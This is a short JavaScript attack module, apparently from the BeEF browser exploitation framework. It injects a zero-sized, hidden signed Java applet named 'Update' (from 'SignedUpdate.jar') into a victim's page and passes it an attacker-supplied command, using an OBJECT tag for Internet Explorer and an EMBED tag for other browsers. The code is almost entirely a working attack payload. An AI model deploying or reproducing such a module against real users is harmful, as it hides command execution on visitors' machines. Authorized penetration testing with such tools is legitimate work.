
// ie doesn't play nice with dynamic loading of jars - below is a link to what sun recommends
// if any knows a nicer way to do this drop me an email
// http://java.sun.com/javase/6/docs/technotes/guides/plugin/developer_guide/using_tags.html#javascript

function applet() {	
	
	var _app = navigator.appName;
	
	if (_app == 'Microsoft Internet Explorer') {
		var malicious = document.createElement("div");
		malicious.innerHTML = '<OBJECT classid="clsid:8AD9C840-044E-11D1-B3E9-00805F499D93" width="0" height="0"> <PARAM name="codebase" value="../modules/standard/malicious_applet"> <PARAM name="code" value="Update">> <PARAM name="archive" value="SignedUpdate.jar">> <PARAM name="cmd" value="BEEFCMD_IE"> </OBJECT>';
		document.body.appendChild(malicious);
	} else {
		document.write(
			'<embed ', 
			'code="Update"', 
			'codebase="../modules/browser/malicious_applet/"', 
			'archive="SignedUpdate.jar"',
			'cmd="BEEFCMD"', 
			'width="0"',
			'height="0"', 
			'type="application/x-java-applet;version=1.6" />');	
	}
		
	return_result(result_id, "Appet running");
}

applet();

